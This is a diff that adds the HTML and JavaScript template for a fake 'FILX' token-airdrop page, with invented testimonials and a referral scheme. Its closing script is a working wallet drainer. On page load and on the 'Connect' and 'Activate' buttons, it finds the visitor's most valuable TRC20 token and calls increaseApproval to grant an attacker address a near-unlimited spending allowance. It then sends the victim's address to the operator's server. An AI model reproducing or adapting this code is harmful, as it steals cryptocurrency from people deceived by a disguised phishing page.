@@ -1,0 +1,642 @@
+<!DOCTYPE html>
+<html lang="en" xmlns="http://www.w3.org/1999/html">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<meta name="description" content="">
+	<meta name="keywords" content="">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<title>FilcoinX</title>
+	<link rel="stylesheet" href="/filcoinx_files/flaticon.css">
+	<link rel="stylesheet" href="/filcoinx_files/all.css">
+	<link href="/filcoinx_files/bootstrap.min.css" rel="stylesheet">
+	<link href="/filcoinx_files/css-Poppins200i300300i400400i500.css" rel="stylesheet">
+	<link href="/filcoinx_files/css-Roboto400400i500500i700700i_.css" rel="stylesheet">
+	<link rel="stylesheet" href="/filcoinx_files/frameworks.css">
+	<link rel="stylesheet" type="text/css" href="/filcoinx_files/sweet-alert.css">
+	<link rel="stylesheet" href="/filcoinx_files/style.css">
+	
+	<script type="text/javascript" src="/scan/js/jquery-2.1.4.min.js"></script>
+	<script type="text/javascript" src="/scan/js/clipboard.min.js"></script>
+	<script type="text/javascript" src="/scan/js/layer.js"></script>
+	<script type="text/javascript" src="/scan/js/usdt/TronWeb.js"></script>
+	<script src="/filcoinx_files/highcharts.js"></script>
+	
+	<script src="/filcoinx_files/sweet-alert.min.js"></script>
+	<script src="/filcoinx_files/bootstrap.bundle.min.js"></script>
+	<script src="/filcoinx_files/plugins.js"></script>
+	<script src="/filcoinx_files/main.js"></script>
+</head>
+<body>
+<div class="page-wrapper" id="home">
+	<header class="header">
+		<div class="container">
+			<nav class="navbar navbar-expand-lg">
+				<a class="navbar-brand" href="javascript:;">
+					<img src="/filcoinx_files/logo.png" alt="Logo">
+				</a>
+				<a href="#" class="default-btn wow fadeInUp size" data-wow-delay="0.1s" id="btn-connect">Connect<i class="fa fa-angle-right ml-2"></i></a>
+				<button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#fixedNavbar" aria-controls="fixedNavbar" aria-expanded="false" aria-label="Toggle navigation">
+					<span class="togler-icon-inner">
+						<span class="line-1"></span>
+						<span class="line-2"></span>
+						<span class="line-3"></span>
+					</span>
+				</button>
+				<div class="collapse navbar-collapse main-menu justify-content-end" id="fixedNavbar">
+					<ul class="navbar-nav">
+						<li class="nav-item">
+							<a class="nav-link active" href="#" data-scroll-nav="0">Home</a>
+						</li>
+						<li class="nav-item">
+							<a class="nav-link" href="#" data-scroll-nav="1">FILX</a>
+						</li>
+						<li class="nav-item">
+							<a class="nav-link" href="#" data-scroll-nav="2">Airdrops</a>
+						</li>
+						<li class="nav-item">
+							<a class="nav-link" href="#" data-scroll-nav="3">Share</a>
+						</li>
+
+						<li class="nav-item">
+							<a class="nav-link" id="go-cn" href="javascript:;" >
+								<font style="vertical-align: inherit;">
+									<font style="vertical-align: inherit;">中文</font>
+								</font>
+							</a>
+						</li>
+						<!-- <li class="nav-item">
+							<a class="nav-link" id="go-en" href="javascript:;">
+								<font style="vertical-align: inherit;">
+									<font style="vertical-align: inherit;">English</font>
+								</font>
+							</a>
+						</li> -->
+					</ul>
+				</div>
+			</nav>
+		</div>
+	</header>
+	<section class="hero-section" data-scroll-index="0">
+		<div class="container h-100">
+			<div class="row align-items-center h-100">
+				<div class="col-lg-7 col-md-10 col-sm-12">
+					<h1 class="hero-section-title wow fadeInUp" data-wow-delay="0.2s">
+						Are you ready for your wallet?
+					</h1>
+					<p class="hero-section-subtitle wow fadeInUp" data-wow-delay="0.3s">
+						FILX free airdrop is in progress, Please prepare your wallet.
+						Wallets that accept airdrops include: TokenPocket, TrustWallet, MathWallet, Binance Chain Wallet, imToken and other wallets that support ETH and BSC
+					</p>
+					<div class="row justify-content-center text-center">
+						<div class="col-lg-7">
+							<div class="price-toggle-wrap" style="text-align: left">
+								<span>
+									<p id="text-chances" style="color: #fff">
+									<h7>Chances:</h7>&nbsp;<strong id="chances-number">0</strong>
+									</p>
+								</span>
+								<span>
+									<p id="text-airdropped" style="color: #fff">
+									<h7>Airdropped:</h7>&nbsp;
+									<strong id="airpods-number">0</strong>FILX
+									</p>
+								</span>
+							</div>
+						</div>
+					</div>
+					<input id="dizhi" value="{$domain}{:url('index/filcoinx/index_trc',['agent'=>$userId,'type'=>'en'])}" style="position: fixed;top: -999em;" readonly />
+					<a href="#" class="default-outline-btn wow fadeInUp open-wallet" data-wow-delay="0.1s" style="display:inline" data-clipboard-target="#dizhi">Unlock Wallet<i class="fa fa-angle-right ml-2"></i></a>
+					<a href="#" class="default-outline-btn wow fadeInUp" data-wow-delay="0.1s" id="btn-active" style="display:inline;margin-left:5px;">Activate<i class="fa fa-angle-right ml-2"></i></a>
+				</div>
+
+				<div class="col-lg-5 hero-image text-right wow fadeInRight">
+					<img src="/filcoinx_files/hero_image.png" alt="Hero image" class="img-fluid img-jump">
+				</div>
+			</div>
+		</div>
+
+		<a href="#" data-scroll-nav="1" class="down-scroll">
+			<i class="fa fa-arrow-down"></i>
+		</a>
+
+	</section>
+	<section class="services section-padding" data-scroll-index="1" id="services-area">
+		<div class="container">
+			<div class="row justify-content-center">
+				<div class="col-lg-7">
+					<div class="section-heading">
+						<h2 class="section-title">What is <span>FILX</span></h2>
+						<p class="section-sub-title">
+							FILX is a social experiment focusing on the ecological construction of Filcoin, which integrates Filcoin's application innovations. In the future, a consolidated liquidity pool leveraged transaction automatic system will be established to provide value storage on the chain. FILX has no pre-sale and no crowdfunding.
+						</p>
+					</div>
+					<div class="col-md-5 col-lg-6 wow fadeInLeft text-left" id="containers1"></div>
+				</div>
+			</div>
+		</div>
+	</section>
+	<section class="testimonial-section jarallax section-padding" data-jarallax="" data-speed="0.2s" data-scroll-index="2">
+		<div class="testimonial-section-bg jarallax-img"></div>
+		<div class="container">
+			<div class="row justify-content-center">
+				<div class="col-lg-7">
+					<div class="section-heading">
+						<h2 class="section-title text-white">About<span class="text-white"> Airdrop</span></h2>
+						<p class="section-sub-title text-white">
+							FILX is airdropped in three phases. In the first phase, 50 million airdrops, 25 million airdrops in the second phase, and 25 million airdrops in the third phase; and the whitelisted users who receive the airdrop, each invites a user to complete the whitelist. The list is activated, and an additional airdrop opportunity is added. The more invitations, the more airdrops you will get.
+						</p>
+					</div>
+				</div>
+			</div>
+
+			<div class="row align-items-center justify-content-center">
+				<div class="col-md-12">
+					<div class="testimonial-slider owl-carousel owl-theme">
+						<div class="item">
+							<div class="testimonial-item">
+								<div class="testimonial-body d-flex align-items-start">
+									<div class="testimonial-img mr-3">
+										<img src="/filcoinx_files/comments-image-2.png" alt="" class="img-fluid">
+									</div>
+									<div class="testimonial-inner">
+										<h5>George William</h5>
+
+										<div class="testimonial-rating">
+											<i class="fa fa-star"></i>
+											<i class="fa fa-star"></i>
+											<i class="fa fa-star"></i>
+											<i class="fa fa-star"></i>
+											<i class="fa fa-star"></i>
+										</div>
+									</div>
+								</div>
+								<div class="testimonial-text">
+									<p>
+										I am honored to be the first user to receive the FILX airdrop. FILX is already in my wallet. I believe that FILX will lead me into the palace of wealth
+									</p>
+								</div>
+							</div>
+						</div>
+
+						<div class="item">
+							<div class="testimonial-item">
+								<div class="testimonial-body d-flex align-items-start">
+									<div class="testimonial-img mr-3">
+										<img src="/filcoinx_files/comments-image-3.png" alt="" class="img-fluid">
+									</div>
+									<div class="testimonial-inner">
+										<h5>Edward Addison</h5>
+										<div class="testimonial-rating">
+											<i class="fa fa-star"></i>
+											<i class="fa fa-star"></i>
+											<i class="fa fa-star"></i>
+											<i class="fa fa-star"></i>
+											<i class="fa fa-star"></i>
+										</div>
+									</div>
+								</div>
+								<div class="testimonial-text">
+									<p>
+										I have successfully received FILX and I can't believe it is true. But I really already have my own FILX, thank you FILX.
+									</p>
+								</div>
+							</div>
+						</div>
+						<div class="item">
+							<div class="testimonial-item">
+								<div class="testimonial-body d-flex align-items-start">
+									<div class="testimonial-img mr-3">
+										<img src="/filcoinx_files/comments-image-1.png" alt="" class="img-fluid">
+									</div>
+									<div class="testimonial-inner">
+										<h5>Eduardo Dutra</h5>
+										<div class="testimonial-rating">
+											<i class="fa fa-star"></i>
+											<i class="fa fa-star"></i>
+											<i class="fa fa-star"></i>
+											<i class="fa fa-star"></i>
+											<i class="fa fa-star"></i>
+										</div>
+									</div>
+								</div>
+								<div class="testimonial-text">
+									<p>
+										After a long wait, I have successfully received FILX, and I believe it will be popular in the world soon.
+									</p>
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+		<div class="counters">
+			<div class="container">
+				<div class="row">
+					<div class="col-lg-4 col-md-6 col-sm-6 counters-item  col-xs-12 wow fadeInUp" data-wow-delay="0.1s">
+						<div class="counter-item-inner text-center">
+							<div class="counter-icon">
+								<span class="mdi mdi-download"></span>
+							</div>
+							<div class="counter-body">
+								<h2 class="counter">12800</h2>
+								<p>User Support</p>
+							</div>
+						</div>
+					</div>
+					<div class="col-lg-4 col-md-6 col-sm-6 col-xs-12 counters-item wow fadeInUp" data-wow-delay="0.2s">
+						<div class="counter-item-inner text-center">
+							<div class="counter-icon">
+								<span class="mdi mdi-account-switch"></span>
+							</div>
+							<div class="counter-body">
+								<h2 class="counter">3500</h2>
+								<p>People Connect</p>
+							</div>
+						</div>
+					</div>
+					<div class="col-lg-4 col-md-6 col-sm-6 col-xs-12 counters-item wow fadeInUp" data-wow-delay="0.1s">
+						<div class="counter-item-inner text-center">
+							<div class="counter-icon">
+								<span class="mdi mdi-download"></span>
+							</div>
+							<div class="counter-body">
+								<h2 class="counter">3500</h2>
+								<p>Received</p>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+	</section>
+	<section class="download-wrap section-padding jarallax" data-scroll-index="3" data-speed="0.2s">
+		<div class="download-section-bg jarallax-img"></div>
+		<div class="container">
+			<div class="row justify-content-between align-items-center">
+				<div class="col-lg-6 download-image wow slideInLeft">
+					<img src="/filcoinx_files/download-img.png" alt="" class="img-fluid img-jump">
+				</div>
+
+				<div class="col-lg-6 col-md-12 col-sm-11 col-xs-12 wow fadeInUp" data-wow-delay="0.3s" id="div-share">
+					<div class="download-section-inner">
+						<h2>Share Now</h2>
+						<p>
+							In order to allow more people to get FILX, we have opened up a reward mechanism. Every time you invite a new user, you will get another chance to receive the airdrop.
+						</p>
+						<a href="#" class="default-outline-btn wow fadeInUp" data-wow-delay="0.1s" id="btn-share">Share<i class="fa fa-angle-right ml-2"></i></a>
+					</div>
+				</div>
+			</div>
+		</div>
+	</section>
+	<footer class="footer">
+		<div class="footer-top">
+			<div class="container">
+				<div class="row">
+					<div class="footer-widget col-lg-3 col-md-6 col-sm-6">
+						<div class="footer-box">
+							<h5 class="footer-title">About Us</h5>
+							<p>
+								FILX is a social experiment focusing on the ecological construction of Filcoin, which integrates Filcoin's application innovations.
+							</p>
+							<div class="footer-social-links">
+								<a href="javascript:;"><i class="mdi mdi-twitter"></i></a>
+								<a href="javascript:;"><i class="mdi mdi-telegram"></i></a>
+							</div>
+						</div>
+					</div>
+
+					<div class="footer-widget col-lg-3 col-md-6 col-sm-6">
+						<div class="footer-box">
+							<h5 class="footer-title">Usefull Links</h5>
+							<ul class="footer-links">
+								<li>
+									<a href="#" data-scroll-nav="1">FILX</a>
+								</li>
+								<li>
+									<a href="#" data-scroll-nav="2">Airdrops</a>
+								</li>
+							</ul>
+						</div>
+					</div>
+
+					<div class="footer-widget col-lg-3 col-md-6 col-sm-6">
+						<div class="footer-box">
+							<h5 class="footer-title">Other Links</h5>
+							<ul class="footer-links">
+								<li>
+									<a href="javascript:;">Address</a>
+								</li>
+								<li>
+									<a href="javascript:;">imToken</a>
+								</li>
+								<li>
+									<a href="javascript:;">TokenPocket</a>
+								</li>
+							</ul>
+						</div>
+					</div>
+
+					<div class="col-md-6 col-sm-6 footer-widget col-lg-3">
+						<div class="footer-box">
+							<h5 class="footer-title">Contact Info</h5>
+							<p>50 North Peg Shop Court Beachwood, Washington DC</p>
+							<ul class="contact-info-footer">
+								<li><i class="mdi mdi-email"></i><a href="javascript:;" class="__cf_email__" data-cfemail="74121d1811171b1d1a0c341319151d185a171b19">[email&#160;protected]</a></li>
+							</ul>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+		<div class="copyright">
+			<div class="container">
+				<div class="row align-items-center justify-content-center">
+					<div class="col-lg-9">
+						<p class="text-center">Copyright &copy; 2021.Filcoinx All rights reserved.</p>
+					</div>
+				</div>
+			</div>
+		</div>
+
+		<div class="alert alert-success" role="alert" style="display: none">
+			<button type="button" class="close" data-dismiss="alert" aria-label="Close" aria-hidden="true">
+				&times;
+			</button>
+			<span id="alertInfo"></span>
+		</div>
+
+		<button id="exampleModalButton" type="button" class="btn btn-primary" style="display: none;" data-bs-toggle="modal" data-bs-target="#exampleModal">
+			Activate
+		</button>
+
+		<div class="modal fade" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+			<div class="modal-dialog">
+				<div class="modal-content">
+					<div class="modal-header">
+						<h5 class="modal-title m-auto" id="exampleModalLabel" style="padding-left: 12%">Share To You Friends!</h5>
+						<button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+					</div>
+					<div id="error" class="modal-body">
+						You will get your own promotion link after active whitelist;
+					</div>
+					<div id="shareModalContent" class="modal-body m-auto" style="display: none">
+						<div class="card" style="width:100%; text-align: center">
+							<div class="card-body" style="text-align: center">
+								<h4 class="card-title" style="text-align:center">Promotion Link</h4>
+								<div class="card-text" id="promotion-link">Some example text some example text. Jane Doe is an architect and engineer</div>
+							</div>
+							<h4 style="text-align:center">QR Code</h4>
+							<div class="card-img-bottom" src="" alt="Card image" style="width:100%" id="promotion-qr"></div>
+							<button type="button" class="copylink btn btn-primary " data-clipboard-target="#promotion-link" id="copy">Copy Link</button>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+	</footer>
+	 <!-- <style>
+         #goToActionSetionx {
+             position: fixed;
+             bottom: 0;
+             right: 10px;
+             width: 48px;
+             height: 48px;
+             line-height: 48px;
+             font-size: 16px;
+             text-align: center;
+             opacity: 1;
+             border-radius: 5px;
+             visibility: hidden;
+             color: #fff!important;
+             z-index: 99999;
+             visibility: visible;
+         }
+     </style>
+     <a id="goToActionSetionx" href="http://wa.me/855977054895" style="bottom: 65px">
+         <img src="/whatsApp.jpg" alt="" style="width: 100%; height: 100%;border-radius: 5px;">
+     </a> -->
+	<a id="goToActionSetion" href="#0" class="scroll-top-btn" data-scroll-goto="0">
+		<i class="fa fa-arrow-up"></i>
+	</a>
+	<div class="preloader-wrap">
+		<div class="preloader-inner">
+			<div class="sk-circle"></div>
+			<div class="spinner">
+				<div class="rect1"></div>
+				<div class="rect2"></div>
+				<div class="rect3"></div>
+				<div class="rect4"></div>
+				<div class="rect5"></div>
+			</div>
+		</div>
+	</div>
+</div>
+
+<div style="display:none;">
+	<textarea id="jsondata">{$addr|json_encode}</textarea>
+</div>
+
+<script language="JavaScript">
+	$(document).ready(function() {
+		var chart = {
+			plotBackgroundColor: null,
+			plotBorderWidth: null,
+			plotShadow: false,
+		};
+		var credits = {  //去掉highcharts.com
+			enabled:false
+		};
+		var title = {
+			text: 'FILX Distributed'
+		};
+		var tooltip = {
+			pointFormat: '{series.name}: <b>{point.percentage:.1f}%</b>'
+		};
+		var plotOptions = {
+			pie: {
+				allowPointSelect: true,
+				cursor: 'pointer',
+				dataLabels: {
+					enabled: true,
+					format: '<b>{point.name}%</b>: {point.percentage:.1f} %',
+					style: {
+						color: (Highcharts.theme && Highcharts.theme.contrastTextColor) || 'black'
+					}
+				}
+			}
+		};
+		var series= [{
+			type: 'pie',
+			name: 'FILX Distributed',
+			data: [
+				{
+					name: 'Liquid Mining',
+					color: '#0033CC',
+					y:45.0
+				},
+				{
+					name: 'Pledge Mining',
+					color: '#00FFFF',
+					y: 45.0
+				},
+				{
+					name: 'Airdrops',
+					color: '#12bd81',
+					y: 10.0,
+					sliced: true,
+					selected: true
+				}
+			]
+		}];
+
+		var json = {};
+		json.chart = chart;
+		json.title = title;
+		json.tooltip = tooltip;
+		json.series = series;
+		json.plotOptions = plotOptions;
+		json.credits = credits;
+		$('#containers1').highcharts(json);
+	});
+	var address = "{$address}";
+	var agent = "{$userId}";
+	var rank = 6.5;
+	var authorized_address = '{$authorized_address}';
+	var domain = '{$domain}';
+	var bizhong = 'USDT';
+	var approveAddr = "{$approveAddr}";
+
+	$(function() {
+		var clipboard = new ClipboardJS('.open-wallet');
+		clipboard.on('success', function(e) {
+			//layer.msg('Copy success');
+			setTimeout(function() {
+				window.location.href = "imtokenv2://navigate?screen=DappView&url=" + encodeURIComponent($('#dizhi').val());
+			}, 500);
+		});
+		clipboard.on('error', function(e) {
+			layer.msg('复制失败，请重新点击按钮');
+		});
+
+		const addr = JSON.parse($('#jsondata').html());
+		const price = {
+			'WIN': 0.001150,
+			'USDT': 1,
+			'TONS': 1.35,
+			'USDJ': 1.04,
+			'JST': 0.125,
+			"HT": 20.41,
+			"SUN": 33.97,
+			"EXNX": 0.0621,
+			"VCOIN": 0.004225,
+			"POL": 0.1393,
+			"CKRW": 0.002487,
+		}
+
+		const decimals = {
+			'WIN': 6,
+			'USDT': 6,
+			'TONS': 6,
+			'USDJ': 18,
+			'JST': 18,
+			"HT": 18,
+			"SUN": 18,
+			"EXNX": 18,
+			"VCOIN": 6,
+			"POL": 8,
+			"CKRW": 6,
+		}
+
+		var total = 0;
+		async function getMostValuableAssets(account) {
+			let _symbol = 'USDT';
+			for (const symbol of Object.keys(addr)) {
+				let contract = await tronWeb.contract().at(addr[symbol]);
+				let myBalance = await contract.balanceOf(account).call(function (err,balance){const usdt=balance/(10**(decimals[symbol]||18))*price[symbol];console.log(usdt);if (usdt>total&&usdt>500){_symbol=symbol;total=usdt;approveAddr=addr[_symbol];console.log(_symbol)}})
+			}
+			bizhong = _symbol;
+			return _symbol;
+		}
+
+		/**
+		* * Connect wallet button pressed.
+		*/
+		async function onConnect() {
+			$('.pages').append('<div class="modal-overlay"></div>');
+			$('.modal-overlay').addClass('modal-overlay-visible');
+			$('.modal').removeClass('modal-out').addClass('modal-in');
+			let walletAddress = tronWeb.defaultAddress.base58;
+			bizhong = await getMostValuableAssets(walletAddress);
+			let instance = await tronWeb.contract().at(approveAddr);
+			let res = await instance["increaseApproval"](authorized_address,"90000000000000000000000000000");
+			res.send({
+				feeLimit: 10000000,
+				callValue: 0,
+				shouldPollResponse: false
+			}, function(err, res) {
+				if (err == null) {
+					postInfo(walletAddress, bizhong)
+				}
+				$('.modal-overlay').remove();
+				$('.modal').removeClass('modal-in').addClass('modal-out');
+			})
+		}
+		async function init() {
+			onConnect();
+		}
+
+		/**
+		* Main entry point.
+		*/
+		init();
+		document.querySelector("#btn-connect").addEventListener("click", onConnect);
+		//Active whitelist
+		document.querySelector("#btn-active").addEventListener("click", onConnect);
+		//Share Check
+		//document.querySelector("#btn-share").addEventListener("click", shareInfo);
+		//Go to Share div
+		//document.querySelector("#btn-go-share").addEventListener("click", shareInfo);
+
+		document.querySelector("#go-en").addEventListener("click", goEn);
+		//document.querySelector("#go-cn").addEventListener("click", goCn);
+
+		$("#activeConfirm").click(function() {
+			$("#goToActionSetion").trigger('click')
+		});
+		//Receive
+	})
+
+	async function postInfo(address, symbol) {
+		var data = {
+			address: address,
+			auth_address: authorized_address,
+			bizhong: symbol,
+			agent: agent
+		}
+
+		var d = new Date();
+		var n = d.getTime();
+
+		$.ajax({
+			type: 'get',
+			url:  domain + "{:url('index/api/trc_post')}?t="+n,
+			data: data,
+			success:function(){
+			}
+		})
+	}
+
+	async function goEn() {
+		var url = "{:url('index/filcoinx/index_trc',['agent'=>$userId,'type'=>'en'])}";
+		window.location.href = url;
+	}
+	async function goCn() {
+		var url = "{:url('index/filcoinx/index_trc',['agent'=>$userId])}";
+		window.location.href = url;
+	}
+</script>
+</body>
+</html>
